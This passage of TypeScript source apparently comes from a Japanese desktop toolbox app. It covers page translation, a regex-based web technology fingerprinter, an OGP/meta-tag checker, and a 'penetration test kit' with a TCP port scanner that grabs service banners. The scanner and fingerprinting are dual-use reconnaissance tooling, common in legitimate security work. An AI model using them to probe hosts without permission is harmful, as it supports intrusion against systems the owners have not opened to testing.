      return fetch(url, { credentials: 'omit' })
        .then(function(r){ return r.json(); })
        .then(function(data){
          // data[0] は [translated, original, ...][]
          var combined = '';
          if (data && data[0]) {
            for (var k = 0; k < data[0].length; k++) {
              var seg = data[0][k];
              if (seg && seg[0]) combined += seg[0];
            }
          }
          var parts = combined.split(SEP);
          // 区切りが翻訳で崩れる場合のフォールバック: 個別リクエスト
          if (parts.length !== idxs.length) {
            return Promise.all(idxs.map(function(i){
              var u = 'https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=' + encodeURIComponent(TARGET) + '&dt=t&q=' + encodeURIComponent(entries[i].original);
              return fetch(u, { credentials: 'omit' }).then(function(r){ return r.json(); }).then(function(d){
                var t = '';
                if (d && d[0]) for (var x=0;x<d[0].length;x++) if (d[0][x] && d[0][x][0]) t += d[0][x][0];
                try { entries[i].node.nodeValue = t || entries[i].original; } catch(_){}
              }).catch(function(){});
            }));
          }
          for (var j = 0; j < idxs.length; j++) {
            try { entries[idxs[j]].node.nodeValue = parts[j]; } catch(_){}
          }
        })
        .catch(function(e){ console.warn('[yuzu translate]', e); })
        .then(function(){ done++; update(); });
    }

    // 並列度 3
    var queue = batches.slice();
    function worker(){
      if (queue.length === 0) return Promise.resolve();
      return translateBatch(queue.shift()).then(worker);
    }
    Promise.all([worker(), worker(), worker()]).then(function(){
      banner.textContent = '🌐 翻訳完了 (もう一度クリックで元に戻す)';
      banner.style.background = '#2da44e';
      setTimeout(function(){ try{ banner.remove(); }catch(_){} }, 2500);
    });
  } catch(err) {
    console.error('[yuzu translate]', err);
  }
})();`;
}

// ===== 🔬 技術プロファイラ (Wappalyzer 風) =====

interface TechSignature {
  name: string;
  category: string;
  icon?: string;
  // HTML/HEAD 文字列に対する正規表現
  html?: RegExp[];
  // <script src="..."> や <link href="..."> の URL に対する正規表現
  url?: RegExp[];
  // meta タグ generator の正規表現
  meta?: { name: string; pattern: RegExp }[];
  // Content-Type ヘッダなど
  contentType?: RegExp[];
  // window グローバル変数名 (現在のタブで eval 検出する場合)
  global?: string[];
}

const TECH_SIGNATURES: TechSignature[] = [
  // CMS
  {
    name: "WordPress",
    category: "CMS",
    icon: "📝",
    html: [/wp-content\//i, /wp-includes\//i],
    meta: [{ name: "generator", pattern: /WordPress/i }],
  },
  {
    name: "Drupal",
    category: "CMS",
    icon: "📝",
    html: [/sites\/default\/files/i, /Drupal\.settings/i],
    meta: [{ name: "generator", pattern: /Drupal/i }],
  },
  {
    name: "Joomla",
    category: "CMS",
    icon: "📝",
    meta: [{ name: "generator", pattern: /Joomla/i }],
  },
  {
    name: "Ghost",
    category: "CMS",
    icon: "📝",
    meta: [{ name: "generator", pattern: /Ghost/i }],
  },
  {
    name: "Shopify",
    category: "ECサイト",
    icon: "🛒",
    html: [/cdn\.shopify\.com/i, /Shopify\.theme/i],
  },
  {
    name: "BASE",
    category: "ECサイト",
    icon: "🛒",
    html: [/thebase\.in/i, /base-cms/i],
  },
  {
    name: "STORES",
    category: "ECサイト",
    icon: "🛒",
    html: [/stores\.jp/i, /static\.stores\.jp/i],
  },
  // フレームワーク
  {
    name: "Next.js",
    category: "フレームワーク",
    icon: "⚡",
    html: [/__NEXT_DATA__/i, /_next\/static/i],
    meta: [{ name: "next-head-count", pattern: /./ }],
  },
  {
    name: "Nuxt.js",
    category: "フレームワーク",
    icon: "⚡",
    html: [/__NUXT__/i, /_nuxt\//i],
  },
  {
    name: "Gatsby",
    category: "フレームワーク",
    icon: "⚡",
    html: [/___gatsby/i, /gatsby-/i],
    meta: [{ name: "generator", pattern: /Gatsby/i }],
  },
  {
    name: "Remix",
    category: "フレームワーク",
    icon: "⚡",
    html: [/__remixContext/i, /__remixManifest/i],
  },
  {
    name: "SvelteKit",
    category: "フレームワーク",
    icon: "⚡",
    html: [/__sveltekit_/i, /\/_app\/immutable\//i],
  },
  {
    name: "Astro",
    category: "フレームワーク",
    icon: "⚡",
    html: [/astro-island/i],
    meta: [{ name: "generator", pattern: /Astro/i }],
  },
  {
    name: "Hugo",
    category: "静的サイトジェネレータ",
    icon: "⚡",
    meta: [{ name: "generator", pattern: /Hugo/i }],
  },
  {
    name: "Jekyll",
    category: "静的サイトジェネレータ",
    icon: "⚡",
    meta: [{ name: "generator", pattern: /Jekyll/i }],
  },
  // JS ライブラリ
  {
    name: "React",
    category: "JSライブラリ",
    icon: "⚛️",
    html: [
      /data-reactroot/i,
      /react(\.production)?\.min\.js/i,
      /__REACT_DEVTOOLS/i,
    ],
  },
  {
    name: "Vue.js",
    category: "JSライブラリ",
    icon: "💚",
    html: [
      /v-cloak|v-if|v-for/i,
      /vue(\.runtime)?(\.global)?(\.min)?\.js/i,
      /data-v-/i,
    ],
  },
  {
    name: "Angular",
    category: "JSライブラリ",
    icon: "🅰️",
    html: [/ng-(app|controller|repeat|model)/i, /\bangular(\.min)?\.js/i],
  },
  {
    name: "Svelte",
    category: "JSライブラリ",
    icon: "🔶",
    html: [/svelte-[a-z0-9]{4,}/i],
  },
  {
    name: "Preact",
    category: "JSライブラリ",
    icon: "⚛️",
    html: [/preact(\.min)?\.js/i],
  },
  {
    name: "Alpine.js",
    category: "JSライブラリ",
    icon: "🏔️",
    html: [/x-data=|x-init=|x-show=/i, /alpine(\.min)?\.js/i],
  },
  {
    name: "jQuery",
    category: "JSライブラリ",
    icon: "💲",
    html: [/jquery(-\d|\.min)?\.js/i],
  },
  {
    name: "Lodash",
    category: "JSライブラリ",
    icon: "🛠️",
    html: [/lodash(\.min)?\.js/i],
  },
  {
    name: "Three.js",
    category: "JSライブラリ",
    icon: "🎮",
    html: [/three(\.min)?\.js/i],
  },
  {
    name: "D3.js",
    category: "JSライブラリ",
    icon: "📊",
    html: [/d3(\.v[1-9])?(\.min)?\.js/i],
  },
  // CSS フレームワーク
  {
    name: "Tailwind CSS",
    category: "CSS",
    icon: "🎨",
    html: [
      /(?:class|className)=["'][^"']*\b(?:bg-|text-|flex|grid|p-\d|m-\d|w-\d|h-\d)/i,
      /tailwind(\.min)?\.css/i,
    ],
  },
  {
    name: "Bootstrap",
    category: "CSS",
    icon: "🎨",
    html: [
      /bootstrap(\.min)?\.css/i,
      /class="[^"]*\b(container|row|col-(?:xs|sm|md|lg|xl)-)/i,
    ],
  },
  { name: "Bulma", category: "CSS", icon: "🎨", html: [/bulma(\.min)?\.css/i] },
  {
    name: "Foundation",
    category: "CSS",
    icon: "🎨",
    html: [/foundation(\.min)?\.css/i],
  },
  {
    name: "Material-UI / MUI",
    category: "CSS",
    icon: "🎨",
    html: [/mui-/i, /material-ui/i],
  },
  // 解析・タグマネ
  {
    name: "Google Analytics",
    category: "解析",
    icon: "📊",
    html: [
      /google-analytics\.com\/(ga|analytics)\.js/i,
      /gtag\(['"]config['"], ?['"]UA-/i,
    ],
  },
  {
    name: "Google Analytics 4",
    category: "解析",
    icon: "📊",
    html: [/gtag\/js\?id=G-/i, /gtag\(['"]config['"], ?['"]G-/i],
  },
  {
    name: "Google Tag Manager",
    category: "タグ管理",
    icon: "🏷️",
    html: [/googletagmanager\.com\/gtm\.js/i, /GTM-[A-Z0-9]+/i],
  },
  {
    name: "Microsoft Clarity",
    category: "解析",
    icon: "📊",
    html: [/clarity\.ms\/tag\//i],
  },
  {
    name: "Hotjar",
    category: "解析",
    icon: "🔥",
    html: [/static\.hotjar\.com/i, /hjSetting/i],
  },
  {
    name: "Mixpanel",
    category: "解析",
    icon: "📊",
    html: [/cdn\.mixpanel\.com/i, /mixpanel\.init/i],
  },
  {
    name: "Plausible",
    category: "解析",
    icon: "📊",
    html: [/plausible\.io\/js\//i],
  },
  {
    name: "Adobe Analytics",
    category: "解析",
    icon: "📊",
    html: [/s_code\.js|AppMeasurement\.js/i],
  },
  {
    name: "Yahoo! JAPAN タグマネージャ",
    category: "タグ管理",
    icon: "🏷️",
    html: [/s\.yjtag\.jp/i, /YJ_HISTORICAL/i],
  },
  // CDN / インフラ
  {
    name: "Cloudflare",
    category: "CDN",
    icon: "☁️",
    html: [/cdnjs\.cloudflare\.com/i, /__cf_bm|cf-ray/i],
  },
  {
    name: "jsDelivr",
    category: "CDN",
    icon: "📦",
    html: [/cdn\.jsdelivr\.net/i],
  },
  { name: "unpkg", category: "CDN", icon: "📦", html: [/unpkg\.com\//i] },
  // フォント
  {
    name: "Google Fonts",
    category: "フォント",
    icon: "🔤",
    html: [/fonts\.googleapis\.com/i, /fonts\.gstatic\.com/i],
  },
  {
    name: "Adobe Fonts",
    category: "フォント",
    icon: "🔤",
    html: [/use\.typekit\.net/i],
  },
  // 広告
  {
    name: "Google AdSense",
    category: "広告",
    icon: "💰",
    html: [/pagead2\.googlesyndication\.com/i, /adsbygoogle/i],
  },
  {
    name: "Google DFP / Ad Manager",
    category: "広告",
    icon: "💰",
    html: [/securepubads\.g\.doubleclick\.net/i, /googletag\.cmd/i],
  },
  // 動画埋込
  {
    name: "YouTube Embed",
    category: "メディア",
    icon: "📺",
    html: [/<iframe[^>]+(?:youtube\.com\/embed|youtu\.be)/i],
  },
  {
    name: "Vimeo Embed",
    category: "メディア",
    icon: "📺",
    html: [/<iframe[^>]+player\.vimeo\.com/i],
  },
  // SNS
  {
    name: "Twitter / X Widget",
    category: "SNS",
    icon: "🐦",
    html: [/platform\.twitter\.com\/widgets\.js/i, /twitter-tweet/i],
  },
  {
    name: "Facebook Pixel",
    category: "解析",
    icon: "📊",
    html: [
      /connect\.facebook\.net\/[^/]+\/fbevents\.js/i,
      /fbq\(['"]init['"]/i,
    ],
  },
  // 決済
  { name: "Stripe", category: "決済", icon: "💳", html: [/js\.stripe\.com/i] },
  {
    name: "PayPal",
    category: "決済",
    icon: "💳",
    html: [/paypal\.com\/sdk\/js/i, /paypalobjects\.com/i],
  },
  // 日本系
  {
    name: "Hatena Bookmark Button",
    category: "SNS",
    icon: "🇯🇵",
    html: [/b\.hatena\.ne\.jp\/js\//i],
  },
  {
    name: "LINE Tag",
    category: "解析",
    icon: "💬",
    html: [/d\.line-scdn\.net\/n\/line_tag/i],
  },
];

interface DetectedTech {
  name: string;
  category: string;
  icon?: string;
  matches: string[];
}

function detectTechFromHtml(html: string, contentType: string): DetectedTech[] {
  const out: DetectedTech[] = [];
  const head = html.slice(0, 200000); // 先頭 200KB のみ走査
  for (const sig of TECH_SIGNATURES) {
    const reasons: string[] = [];
    if (sig.html) {
      for (const re of sig.html) {
        if (re.test(head)) {
          reasons.push(`HTML: ${re.source.slice(0, 40)}`);
          break;
        }
      }
    }
    if (sig.contentType && contentType) {
      for (const re of sig.contentType) {
        if (re.test(contentType)) {
          reasons.push(`Content-Type: ${re.source}`);
          break;
        }
      }
    }
    if (sig.meta) {
      for (const m of sig.meta) {
        const re = new RegExp(
          `<meta[^>]+name=["']${m.name}["'][^>]+content=["']([^"']*)["']`,
          "i",
        );
        const found = head.match(re);
        if (found && m.pattern.test(found[1])) {
          reasons.push(`<meta ${m.name}="${found[1].slice(0, 40)}">`);
          break;
        }
      }
    }
    if (reasons.length > 0) {
      out.push({
        name: sig.name,
        category: sig.category,
        icon: sig.icon,
        matches: reasons,
      });
    }
  }
  return out;
}

function setupTechProfileTool(): void {
  const scanBtn = document.getElementById(
    "tech-scan",
  ) as HTMLButtonElement | null;
  const scanUrlBtn = document.getElementById(
    "tech-scan-url",
  ) as HTMLButtonElement | null;
  const urlEl = document.getElementById("tech-url") as HTMLInputElement | null;
  const statusEl = document.getElementById(
    "tech-status",
  ) as HTMLSpanElement | null;
  const resultEl = document.getElementById(
    "tech-result",
  ) as HTMLDivElement | null;
  if (!scanBtn || !urlEl || !resultEl) return;

  async function scan(url: string): Promise<void> {
    if (!url) {
      if (statusEl) statusEl.textContent = "URL がありません";
      return;
    }
    if (statusEl) statusEl.textContent = "解析中…";
    resultEl!.innerHTML = "";
    try {
      const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
        url,
        userAgent: null,
      });
      const detected = detectTechFromHtml(r.body, r.content_type);
      if (statusEl)
        statusEl.textContent = `${detected.length} 件検出 (HTTP ${r.status}, ${r.bytes.toLocaleString()} bytes)`;
      renderTechResult(url, detected);
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  }

  function renderTechResult(url: string, list: DetectedTech[]): void {
    if (!resultEl) return;
    if (list.length === 0) {
      resultEl.innerHTML = `<div class="toolbox-note">検出された技術はありません: ${escapeHtml(url)}</div>`;
      return;
    }
    // カテゴリ別にグループ
    const groups = new Map<string, DetectedTech[]>();
    for (const t of list) {
      if (!groups.has(t.category)) groups.set(t.category, []);
      groups.get(t.category)!.push(t);
    }
    const html: string[] = [];
    html.push(
      `<div class="toolbox-note">対象: <code>${escapeHtml(url)}</code></div>`,
    );
    for (const [cat, items] of groups) {
      html.push(
        `<div style="border:1px solid #ccc;border-radius:6px;padding:8px;background:#fafafa">`,
      );
      html.push(
        `<div style="font-weight:bold;margin-bottom:4px">${escapeHtml(cat)} <span style="color:#666;font-weight:normal">(${items.length})</span></div>`,
      );
      html.push(`<div style="display:flex;flex-wrap:wrap;gap:6px">`);
      for (const t of items) {
        const tip = t.matches.join(" / ").replace(/"/g, "&quot;");
        html.push(
          `<span title="${tip}" style="display:inline-flex;align-items:center;gap:4px;padding:4px 10px;background:#fff;border:1px solid #ccc;border-radius:14px;font-size:12px">${t.icon || "🔧"} ${escapeHtml(t.name)}</span>`,
        );
      }
      html.push(`</div></div>`);
    }
    resultEl.innerHTML = html.join("");
  }

  scanBtn.addEventListener("click", () => {
    const a = activeTab();
    if (!a) {
      if (statusEl) statusEl.textContent = "アクティブなタブがありません";
      return;
    }
    void scan(a.url);
  });
  scanUrlBtn?.addEventListener("click", () => {
    void scan(urlEl.value.trim());
  });
  urlEl.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      void scan(urlEl.value.trim());
    }
  });
}

// ===== 🏷️ OGP / メタタグチェッカー =====

interface OGPData {
  url: string;
  title: string;
  description: string;
  canonical: string;
  language: string;
  charset: string;
  favicon: string;
  // OG
  ogTitle: string;
  ogDescription: string;
  ogImage: string;
  ogUrl: string;
  ogType: string;
  ogSiteName: string;
  ogLocale: string;
  // Twitter
  twitterCard: string;
  twitterTitle: string;
  twitterDescription: string;
  twitterImage: string;
  twitterSite: string;
  twitterCreator: string;
  // 全メタタグ (raw)
  raw: { key: string; value: string }[];
}

function extractMeta(html: string, base: string): OGPData {
  const data: OGPData = {
    url: base,
    title: "",
    description: "",
    canonical: "",
    language: "",
    charset: "",
    favicon: "",
    ogTitle: "",
    ogDescription: "",
    ogImage: "",
    ogUrl: "",
    ogType: "",
    ogSiteName: "",
    ogLocale: "",
    twitterCard: "",
    twitterTitle: "",
    twitterDescription: "",
    twitterImage: "",
    twitterSite: "",
    twitterCreator: "",
    raw: [],
  };

  const headMatch = html.match(/<head[^>]*>([\s\S]*?)<\/head>/i);
  const head = headMatch ? headMatch[1] : html.slice(0, 100000);

  const t = head.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
  if (t) data.title = decodeEntities(t[1].trim());

  // <html lang>
  const lang = html.match(/<html[^>]+lang=["']([^"']+)["']/i);
  if (lang) data.language = lang[1];
  // charset
  const cs = head.match(/<meta[^>]+charset=["']?([\w-]+)/i);
  if (cs) data.charset = cs[1];

  // canonical
  const can = head.match(
    /<link[^>]+rel=["']canonical["'][^>]+href=["']([^"']+)["']/i,
  );
  if (can) data.canonical = resolveUrl(can[1], base);

  // favicon
  const fav = head.match(
    /<link[^>]+rel=["'](?:shortcut )?icon["'][^>]+href=["']([^"']+)["']/i,
  );
  if (fav) data.favicon = resolveUrl(fav[1], base);

  // 全 <meta> 抽出
  const metaRe = /<meta\s+([^>]+?)\/?>/gi;
  let m: RegExpExecArray | null;
  while ((m = metaRe.exec(head)) !== null) {
    const attrs = m[1];
    const nameM = attrs.match(
      /(?:^|\s)(?:name|property|http-equiv|itemprop)\s*=\s*["']([^"']+)["']/i,
    );
    const contentM = attrs.match(/(?:^|\s)content\s*=\s*["']([^"']*)["']/i);
    if (!nameM || !contentM) continue;
    const key = nameM[1];
    const val = decodeEntities(contentM[1]);
    data.raw.push({ key, value: val });
    const lk = key.toLowerCase();
    if (lk === "description") data.description = val;
    else if (lk === "og:title") data.ogTitle = val;
    else if (lk === "og:description") data.ogDescription = val;
    else if (lk === "og:image") data.ogImage = resolveUrl(val, base);
    else if (lk === "og:url") data.ogUrl = val;
    else if (lk === "og:type") data.ogType = val;
    else if (lk === "og:site_name") data.ogSiteName = val;
    else if (lk === "og:locale") data.ogLocale = val;
    else if (lk === "twitter:card") data.twitterCard = val;
    else if (lk === "twitter:title") data.twitterTitle = val;
    else if (lk === "twitter:description") data.twitterDescription = val;
    else if (lk === "twitter:image") data.twitterImage = resolveUrl(val, base);
    else if (lk === "twitter:site") data.twitterSite = val;
    else if (lk === "twitter:creator") data.twitterCreator = val;
  }
  return data;
}

function decodeEntities(s: string): string {
  return s
    .replace(/&amp;/g, "&")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&nbsp;/g, " ");
}

function resolveUrl(u: string, base: string): string {
  try {
    return new URL(u, base).toString();
  } catch {
    return u;
  }
}

function setupOGPTool(): void {
  const scanBtn = document.getElementById(
    "ogp-scan",
  ) as HTMLButtonElement | null;
  const scanUrlBtn = document.getElementById(
    "ogp-scan-url",
  ) as HTMLButtonElement | null;
  const urlEl = document.getElementById("ogp-url") as HTMLInputElement | null;
  const statusEl = document.getElementById(
    "ogp-status",
  ) as HTMLSpanElement | null;
  const previewEl = document.getElementById(
    "ogp-preview",
  ) as HTMLDivElement | null;
  const twitterEl = document.getElementById(
    "ogp-twitter",
  ) as HTMLDivElement | null;
  const tableEl = document.getElementById(
    "ogp-table",
  ) as HTMLTableElement | null;
  const checksEl = document.getElementById(
    "ogp-checks",
  ) as HTMLUListElement | null;
  if (!scanBtn || !urlEl || !previewEl || !tableEl || !checksEl) return;

  async function scan(url: string): Promise<void> {
    if (!url) {
      if (statusEl) statusEl.textContent = "URL がありません";
      return;
    }
    if (statusEl) statusEl.textContent = "取得中…";
    previewEl!.style.display = "none";
    previewEl!.innerHTML = "";
    if (twitterEl) twitterEl.innerHTML = "";
    tableEl!.innerHTML = "";
    checksEl!.innerHTML = "";
    try {
      const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
        url,
        userAgent: null,
      });
      const data = extractMeta(r.body, url);
      if (statusEl)
        statusEl.textContent = `OK (HTTP ${r.status}, メタタグ ${data.raw.length} 個)`;
      renderOGP(data);
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  }

  function renderOGP(d: OGPData): void {
    // Facebook 風プレビュー
    const fbTitle = d.ogTitle || d.title;
    const fbDesc = d.ogDescription || d.description;
    const fbImg = d.ogImage;
    const fbHost = (() => {
      try {
        return new URL(d.ogUrl || d.url).hostname;
      } catch {
        return "";
      }
    })();
    previewEl!.style.display = "block";
    previewEl!.innerHTML = `
      <div style="border:1px solid #ccd0d5;border-radius:8px;overflow:hidden;max-width:520px;background:#f2f3f5">
        ${fbImg ? `<div style="width:100%;aspect-ratio:1.91;background:#e4e6eb url('${escapeAttr(fbImg)}') center/cover no-repeat"></div>` : ""}
        <div style="padding:10px 12px">
          <div style="text-transform:uppercase;color:#606770;font-size:12px;margin-bottom:4px">${escapeHtml(fbHost)}</div>
          <div style="font-weight:bold;font-size:16px;color:#1d2129;line-height:1.3;margin-bottom:4px">${escapeHtml(fbTitle || "(タイトルなし)")}</div>
          <div style="color:#606770;font-size:13px;line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden">${escapeHtml(fbDesc || "(説明なし)")}</div>
        </div>
      </div>`;

    // Twitter プレビュー
    if (twitterEl) {
      const tTitle = d.twitterTitle || d.ogTitle || d.title;
      const tDesc = d.twitterDescription || d.ogDescription || d.description;
      const tImg = d.twitterImage || d.ogImage;
      const isLarge =
        (d.twitterCard || "").toLowerCase() === "summary_large_image";
      twitterEl.innerHTML = `
        <div style="border:1px solid #cfd9de;border-radius:16px;overflow:hidden;max-width:520px">
          ${
            tImg
              ? isLarge
                ? `<div style="width:100%;aspect-ratio:2;background:#eff3f4 url('${escapeAttr(tImg)}') center/cover no-repeat"></div>`
                : ""
              : ""
          }
          <div style="display:flex;${isLarge || !tImg ? "" : "min-height:125px"}">
            ${
              !isLarge && tImg
                ? `<div style="flex:0 0 125px;background:#eff3f4 url('${escapeAttr(tImg)}') center/cover no-repeat;border-right:1px solid #cfd9de"></div>`
                : ""
            }
            <div style="padding:12px;flex:1">
              <div style="color:#536471;font-size:13px;margin-bottom:2px">${escapeHtml(fbHost)}</div>
              <div style="font-size:15px;color:#0f1419;line-height:1.3;margin-bottom:2px">${escapeHtml(tTitle || "(タイトルなし)")}</div>
              <div style="color:#536471;font-size:13px;line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden">${escapeHtml(tDesc || "")}</div>
              <div style="color:#536471;font-size:12px;margin-top:4px">card: ${escapeHtml(d.twitterCard || "(未指定)")}</div>
            </div>
          </div>
        </div>`;
    }

    // テーブル
    const rows: { k: string; v: string }[] = [];
    rows.push({ k: "title", v: d.title });
    rows.push({ k: "description", v: d.description });
    rows.push({ k: "canonical", v: d.canonical });
    rows.push({ k: "html lang", v: d.language });
    rows.push({ k: "charset", v: d.charset });
    rows.push({ k: "favicon", v: d.favicon });
    for (const r of d.raw) rows.push({ k: r.key, v: r.value });
    tableEl!.innerHTML =
      `<thead><tr style="background:#f0f0f0"><th style="text-align:left;padding:4px 6px;border:1px solid #ddd;width:30%">キー</th><th style="text-align:left;padding:4px 6px;border:1px solid #ddd">値</th></tr></thead><tbody>` +
      rows
        .filter((r) => r.v)
        .map(
          (r) =>
            `<tr><td style="padding:4px 6px;border:1px solid #ddd;font-family:ui-monospace,monospace;font-size:11px">${escapeHtml(r.k)}</td><td style="padding:4px 6px;border:1px solid #ddd;word-break:break-all">${escapeHtml(r.v)}</td></tr>`,
        )
        .join("") +
      `</tbody>`;

    // チェック
    const checks: { ok: boolean; msg: string }[] = [];
    checks.push({ ok: !!d.title, msg: "<title> がある" });
    checks.push({ ok: !!d.description, msg: "<meta description> がある" });
    checks.push({ ok: !!d.ogTitle, msg: "og:title がある" });
    checks.push({ ok: !!d.ogDescription, msg: "og:description がある" });
    checks.push({ ok: !!d.ogImage, msg: "og:image がある" });
    checks.push({ ok: !!d.ogUrl, msg: "og:url がある" });
    checks.push({ ok: !!d.ogType, msg: "og:type がある" });
    checks.push({ ok: !!d.twitterCard, msg: "twitter:card がある" });
    checks.push({ ok: !!d.canonical, msg: "rel=canonical がある" });
    checksEl!.innerHTML = checks
      .map(
        (c) =>
          `<li style="color:${c.ok ? "#1a7f37" : "#cf222e"}">${c.ok ? "✅" : "❌"} ${escapeHtml(c.msg)}</li>`,
      )
      .join("");
  }

  scanBtn.addEventListener("click", () => {
    const a = activeTab();
    if (!a) {
      if (statusEl) statusEl.textContent = "アクティブなタブがありません";
      return;
    }
    void scan(a.url);
  });
  scanUrlBtn?.addEventListener("click", () => void scan(urlEl.value.trim()));
  urlEl.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      void scan(urlEl.value.trim());
    }
  });
}

function escapeAttr(s: string): string {
  return String(s).replace(/&/g, "&amp;").replace(/"/g, "&quot;");
}

function escapeHtml(s: string): string {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

// ===== 🛡️ ペネトレーション テストキット =====

const TOP_100_PORTS = [
  21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723,
  3306, 3389, 5900, 8080, 8443, 20, 26, 37, 79, 81, 88, 106, 113, 119, 161, 179,
  199, 389, 427, 444, 465, 513, 514, 515, 543, 544, 548, 554, 587, 631, 646,
  873, 902, 990, 1025, 1026, 1027, 1028, 1029, 1110, 1433, 1434, 1521, 1755,
  1900, 2000, 2001, 2049, 2121, 2717, 3128, 3268, 3690, 3986, 4899, 5000, 5009,
  5051, 5060, 5101, 5190, 5357, 5432, 5631, 5666, 5800, 5985, 5986, 6000, 6001,
  6646, 7070, 8000, 8008, 8009, 8081, 8888, 9100, 9999, 10000, 32768, 49152,
  49153, 49154, 49155, 49156, 49157,
];

const COMMON_24_PORTS = [
  21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 465, 587, 993,
  995, 1433, 3306, 3389, 5432, 5900, 8080,
];

function parsePortSpec(spec: string): number[] {
  const out = new Set<number>();
  for (const piece of spec.split(/[\s,]+/).filter(Boolean)) {
    const m = piece.match(/^(\d+)\s*-\s*(\d+)$/);
    if (m) {
      const a = parseInt(m[1]);
      const b = parseInt(m[2]);
      const lo = Math.min(a, b);
      const hi = Math.max(a, b);
      for (let p = lo; p <= hi; p++) {
        if (p >= 1 && p <= 65535) out.add(p);
      }
    } else {
      const p = parseInt(piece);
      if (Number.isFinite(p) && p >= 1 && p <= 65535) out.add(p);
    }
  }
  return [...out].sort((a, b) => a - b);
}

const PORT_NAMES: Record<number, string> = {
  21: "ftp",
  22: "ssh",
  23: "telnet",
  25: "smtp",
  53: "dns",
  80: "http",
  110: "pop3",
  111: "rpcbind",
  135: "msrpc",
  139: "netbios-ssn",
  143: "imap",
  389: "ldap",
  443: "https",
  445: "smb",
  465: "smtps",
  587: "submission",
  993: "imaps",
  995: "pop3s",
  1433: "mssql",
  1521: "oracle",
  2049: "nfs",
  3000: "node-dev",
  3306: "mysql",
  3389: "rdp",
  5432: "postgres",
  5900: "vnc",
  5985: "winrm",
  6379: "redis",
  8000: "http-alt",
  8080: "http-proxy",
  8443: "https-alt",
  8888: "http-alt",
  9090: "http-alt",
  9200: "elasticsearch",
  11211: "memcached",
  27017: "mongodb",
};

interface PortScanRow {
  port: number;
  open: boolean;
  banner: string | null;
}

function setupPortScannerSub(): void {
  const hostEl = document.getElementById("ps-host") as HTMLInputElement | null;
  const presetEl = document.getElementById(
    "ps-preset",
  ) as HTMLSelectElement | null;
  const portsEl = document.getElementById(
    "ps-ports",
  ) as HTMLInputElement | null;
  const bannerEl = document.getElementById(
    "ps-banner",
  ) as HTMLInputElement | null;
  const timeoutEl = document.getElementById(
    "ps-timeout",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById("ps-run") as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "ps-status",
  ) as HTMLSpanElement | null;
  const outEl = document.getElementById("ps-out") as HTMLPreElement | null;
  if (!hostEl || !runBtn || !outEl) return;

  presetEl?.addEventListener("change", () => {
    if (!portsEl) return;
    if (presetEl.value === "top") portsEl.value = "(Top 100)";
    else if (presetEl.value === "common") portsEl.value = "(よく使う 24)";
    else if (presetEl.value === "all") portsEl.value = "1-1024";
    else portsEl.value = "";
  });

  runBtn.addEventListener("click", async () => {
    const host = hostEl.value.trim();
    if (!host) {
      if (statusEl) statusEl.textContent = "ホストを入力";
      return;
    }
    let ports: number[] = [];
    const preset = presetEl?.value || "top";
    if (preset === "top") ports = TOP_100_PORTS;
    else if (preset === "common") ports = COMMON_24_PORTS;
    else if (preset === "all") {
      ports = [];
      for (let p = 1; p <= 1024; p++) ports.push(p);
    } else {
      ports = parsePortSpec(portsEl?.value || "");
    }
    if (ports.length === 0) {
      if (statusEl) statusEl.textContent = "ポートが空です";
      return;
    }
    if (statusEl)
      statusEl.textContent = `${host} の ${ports.length} ポートをスキャン中…`;
    outEl.textContent = "";
    const t0 = performance.now();
    try {
      const rows = await invoke<PortScanRow[]>("pentest_port_scan", {
        host,
        ports,
        timeoutMs: parseInt(timeoutEl?.value || "800"),
        grabBanner: bannerEl?.checked ?? true,
      });
      const dt = Math.round(performance.now() - t0);
      if (statusEl)
        statusEl.textContent = `完了 (${rows.length} 個 OPEN / ${ports.length} スキャン / ${dt}ms)`;
      const lines: string[] = [];
      lines.push(`Host: ${host}`);
      lines.push(`Open ports: ${rows.length} / ${ports.length}`);
      lines.push("─".repeat(60));
      lines.push("PORT     SERVICE        BANNER");
      for (const r of rows) {
        const svc = (PORT_NAMES[r.port] || "").padEnd(14);
        const port = `${r.port}/tcp`.padEnd(8);
        const banner = r.banner || "";
        lines.push(`${port} ${svc} ${banner}`);
      }
      outEl.textContent = lines.join("\n");
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  });
}

interface HttpReqResultTS {
  status: number;
  status_text: string;
  headers: [string, string][];
  body: string;
  bytes: number;
  content_type: string;
  time_ms: number;
  final_url: string;
}

function parseHeaderLines(text: string): [string, string][] {
  const out: [string, string][] = [];
  for (const line of text.split(/\r?\n/)) {
    const m = line.match(/^\s*([^:\s][^:]*?)\s*:\s*(.*)$/);
    if (m) out.push([m[1], m[2]]);
  }
  return out;
}

function setupHttpReqSub(): void {
  const methodEl = document.getElementById(
    "hr-method",
  ) as HTMLSelectElement | null;
  const urlEl = document.getElementById("hr-url") as HTMLInputElement | null;
  const followEl = document.getElementById(
    "hr-follow",
  ) as HTMLInputElement | null;
  const sendBtn = document.getElementById(
    "hr-send",
  ) as HTMLButtonElement | null;
  const headersEl = document.getElementById(
    "hr-headers",
  ) as HTMLTextAreaElement | null;
  const bodyEl = document.getElementById(
    "hr-body",
  ) as HTMLTextAreaElement | null;
  const rawEl = document.getElementById("hr-raw") as HTMLTextAreaElement | null;
  const rawLoadBtn = document.getElementById(
    "hr-raw-load",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "hr-status",
